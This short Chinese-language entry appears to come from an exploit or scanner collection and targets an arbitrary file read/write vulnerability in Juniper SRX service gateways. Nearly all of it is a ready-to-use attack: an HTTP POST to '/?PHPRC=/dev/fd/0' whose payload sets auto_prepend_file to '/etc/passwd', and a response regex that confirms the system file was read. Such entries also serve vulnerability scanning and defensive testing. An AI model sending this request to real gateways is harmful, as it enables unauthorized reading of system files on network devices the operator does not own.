# JuniperSRX系列服务网关任意文件读取漏洞

JuniperSRX ｜ 任意文件读取/写入 ｜ —
- **请求**：`POST /?PHPRC=/dev/fd/0 HTTP/1.1`

**Payload**
```
auto_prepend_file="/etc/passwd"
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$